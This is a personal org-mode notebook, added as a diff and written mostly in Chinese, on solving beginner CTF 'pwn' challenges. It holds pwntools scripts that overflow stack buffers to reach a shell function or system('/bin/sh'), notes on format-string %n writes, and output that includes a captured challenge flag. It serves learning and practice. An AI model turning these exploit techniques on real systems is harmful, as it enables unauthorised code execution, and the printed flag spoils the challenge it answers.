@@ -1,0 +1,223 @@
+* 工具安装与学习
+  #+BEGIN_SRC shell
+    git clone https://github.com/pwndbg/pwndbg
+    cd pwndbg
+    ./setup.sh
+  #+END_SRC
+
+  #+BEGIN_SRC shell
+    git clone https://github.com/pwndbg/pwndbg
+    cd pwndbg
+    ./setup.sh
+  #+END_SRC
+
+* Tips for using gdb  
+* 基础篇
+
+** level1
+   :PROPERTIES:
+   :header-args: :dir ./bin
+   :END:
+
+   通过下面的代码判定返回地址偏移
+   #+BEGIN_SRC python :session level1
+	 from pwn import *
+	 
+	 p = process('./pwn_level1')
+	 gdb.attach(p)
+	 p.recvuntil('try to stackoverflow!!')
+	 p.send(cyclic(0x100))
+	 p.interactive()
+   #+END_SRC 
+
+   #+RESULTS:
+
+   通过cyclic_find得到偏移地址13
+   #+BEGIN_SRC python :session level1 :results output 
+	 from pwn import *
+
+	 p = process('./pwn_level1')
+	 gdb.attach(p)
+	 p.recvuntil('try to stackoverflow!!')
+	 p.send(cyclic(0x100))
+	 print(cyclic_find('aaae'))
+   #+END_SRC
+
+   #+RESULTS:
+   : Traceback (most recent call last):
+   :   File "<stdin>", line 1, in <module>
+   :   File "/tmp/babel-AudvWm/python-e2ZrMk", line 1, in <module>
+   :     from pwn import *
+   : ModuleNotFoundError: No module named 'pwn'
+   
+   直接exploit到目标函数
+   #+BEGIN_SRC python :session level1
+	 from pwn import *
+
+	 p=process('./pwn_level1')
+	 gdb.attach(p)
+
+	 p.recvuntil('try to stackoverflow!!')
+
+	 p.send(('a'*13).encode('ascii')+p32(0x804849a)) 
+
+	 p.interactive()
+
+   #+END_SRC
+
+   #+RESULTS:
+  
+** get_shell   
+   
+   没做过pwn, 所以直接看题解, 所以是要用nc连对应的端口, 然后才开始, 
+   所以一般pwn的思路就是先在附件上研究, 然后在对应端口exploit拿到shell吧
+
+** hello_pwn
+   
+   用IDA打开, 看了一下逻辑, 大概就是在bss中通过数组溢出覆盖另一个局部变量
+
+   注意覆盖的类型是dd, 由于大小端的原因, 如果要覆盖成"0x6E756161", 则需要填充字节"aaun"
+
+   #+BEGIN_SRC python :results output
+	 from pwn import *
+	 conn = remote('111.200.241.244', 65336)
+	 conn.send(('a'*4 + 'aaun').encode('ascii'))
+	 conn.recvuntil("for bof\n")
+	 print(conn.recvline())
+   #+END_SRC
+
+   #+RESULTS:
+   : [x] Opening connection to 111.200.241.244 on port 65336
+   : [x] Opening connection to 111.200.241.244 on port 65336: Trying 111.200.241.244
+   : [+] Opening connection to 111.200.241.244 on port 65336: Done
+   : b'cyberpeace{6f3c8100c42eb5959821d21005899c2f}\n'
+   : [*] Closed connection to 111.200.241.244 port 65336
+   
+** level0   
+   用IDA看一下逻辑, vunerable_function里有溢出点, 并且程序中有system("/bin/sh"), 所以覆盖返回地址即可
+   
+   先看一下返回值偏移
+   
+   #+BEGIN_SRC python :session 
+	 from pwn import *
+
+	 p = process("/home/dell/Downloads/291721f42a044f50a2aead748d539df0")
+	 p.send(cyclic(0x500))
+	 cyclic_find('jaabkaab')
+   #+END_SRC
+
+   #+RESULTS:
+   : 136
+   
+   然后溢出即可
+   #+BEGIN_SRC python :tangle level0.py
+	 from pwn import *
+	 #p = process("/home/dell/Downloads/291721f42a044f50a2aead748d539df0")
+	 p = remote('111.200.241.244', 54089)
+	 print(p.recvline())
+	 p.send(('a'*136).encode('ascii') + b'\x96\x05\x40') # or p64(0x400596)	 
+	 p.interactive()
+   #+END_SRC
+
+   #+RESULTS:
+   
+** level2   
+   
+   发现溢出点, 老规矩, 找偏移
+   #+BEGIN_SRC python :session
+	 from pwn import *
+	 p = process('/home/dell/Downloads/1ab77c073b4f4524b73e086d063f884e')
+	 cyclic(0x500)
+	 cyclic_find('kaab')
+   #+END_SRC
+
+   #+RESULTS:
+   : 140
+
+   没有直接的system("bin/sh")调用, 但是有system函数导入就够了, 将返回地址覆盖为system地址, 然后伪造一个system("/bin/sh")的调用栈帧即可
+   
+   在正常情况下, 我们是通过call指令来进行函数调用的, 在进入system函数前, call指令其实已经push了eip, 即正常情况下system的调用栈帧如下:
+   | ret: 即调用system的地址+1, 这个地址可以任意, 因为我们并没有通过call调用 <- esp |
+   | "/bin/sh": 调用的参数                                                          |
+
+   因为刚进入system函数, 栈顶还没抬高, 所以esp指向的是压入的返回地址(因为不是call调用的, 所以这个值不重要), 而ret后面就是调用参数了
+
+   所以覆盖缓冲区如下:
+   | ...        |
+   | system@plt |
+   | ret: any   |
+   | "/bin/sh"  |
+
+   值得注意的是, 通过查看system的实现, 可以发现system并没有用到ebp来访问参数和局部变量(对于一般函数是需要ebp的), 所以我们可以任意覆盖
+   ebp的值, 虽然后面会发生堆栈不平衡的问题
+
+   #+BEGIN_SRC python :tangle level2.py
+	 from pwn import *
+	 p = remote('111.200.241.244', 49488)
+	 #p = process('/home/dell/Downloads/1ab77c073b4f4524b73e086d063f884e')
+	 #gdb.attach(p)
+	 e = ELF('/home/dell/Downloads/1ab77c073b4f4524b73e086d063f884e')
+	 binaddr = 0x804A024
+	 p.sendlineafter(':', flat(['a'*0x88 + 'b'*4, e.plt['system'], 0, binaddr]))
+	 p.interactive()
+   #+END_SRC
+
+   #+RESULTS:
+   : b'Input:'
+   
+         
+** string   
+
+   这一部分知识不太熟, 先学习一下
+	
+   格式化占位符的语法:
+	
+   %[parameter][flags][field width][.precision][length]type
+
+   flags, filed width, precision以及length都是控制输出格式的, 并不重要
+
+   重点是parameter, 这个参数可以控制输出第几个参数
+
+   例如: %100d 就是指输出第100个整数, 但由于printf本身并不对参数进行检查, 所以我们可以利用parameter实现任意内存读取
+   
+   #+BEGIN_SRC C++
+	 #include <stdio.h>
+
+	 int main() {
+	   int s = 0;
+	   printf ("the value of s is %n", &s);
+	   printf ("%d\n", s);
+	 }
+   #+END_SRC
+
+   #+RESULTS:
+   : the value of s is 18
+
+   %n: 将已输出的字符个数赋值给s, 我也不知道为什么有这么奇怪的东西
+
+   但利用%n, 我们其实可以实现任意内存写入
+
+   如下面的例子:
+
+   #+BEGIN_SRC C++
+	 #include <stdio.h>
+	 #include <string.h>
+ 
+	 int main(int argc,char **argv)
+	 {
+			 char str[100];
+			 static int a = 0;
+			 printf("%x\n",&a);
+			 strcpy(str,argv[1]);
+			 printf(str);
+			 printf("\n%d\n",a);
+	 }
+   #+END_SRC
+
+   在 printf 中，使用 *<a_number_of_chars>%<number>$n* 就可以将相应的第 *<number>* 个参数的位置写为 % 前输出的字符数量
+
+   例如: %85c%7$n 就是将第7个参数的位置写成85
+
+   再看题目, 大概明白是通过sub_400bb9中的漏洞实现对a1的修改, 然后就可以写入shellcode并执行了, 但具体流程还是不清楚, 看一下writeup吧
+   
+   
